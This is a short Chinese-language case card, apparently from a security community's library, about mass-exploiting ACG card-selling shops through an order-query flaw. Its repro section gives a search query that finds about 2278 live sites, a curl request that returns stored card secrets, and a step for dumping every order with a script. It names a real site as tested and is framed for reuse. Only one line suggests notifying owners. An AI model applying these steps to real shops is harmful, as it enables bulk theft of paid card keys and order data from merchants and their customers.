# ACG 发卡站系批量攻陷

- Source report: `acg_mass_hunt_report.md`
- Full report: `domains/business-logic/case-reports/acg-faka-mass-hunt/acg_mass_hunt_report.md`
- Techniques: payment
- Fused: 2026-09-17

## Key findings (distilled)

- 命中后同库全量订单(含历史已支付+卡密)可线性拖出
- 实测 **5173rhao.cc**: 未支付单号+空密码 → 该单卡密即出(若订单 password_status=0)
- 新版(3.1.0)服务端校验 password,仅已支付且未设密码的订单可空密码取
- note**: 需「已支付单号」作钥匙;单号格式 `18位=3随机+12时间戳+3随机`
- 建议对漏洞站发起通报(联系店主/平台更新 acg 系统)

## Repro snippets

```
查询语法: body="/assets/static/acg.js" && country="CN"
命中总量: 2278 个站 (IP+域名去重后 约1204 独立域)
关键词补充: title 含 账号|卡密|发卡|自助|批发|成品号
# 1. 验证某站是否可拖
curl -X POST https://TARGET/user/api/index/query -d 'keywords=-&page=1&limit=20'
# 判断: 返回含 list[].secret 即命中

# 2. 落地数据
python3 dump_<site>.py   # 翻页至 total 拉全量
```

## When to reuse

- 同类标签命中：payment
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
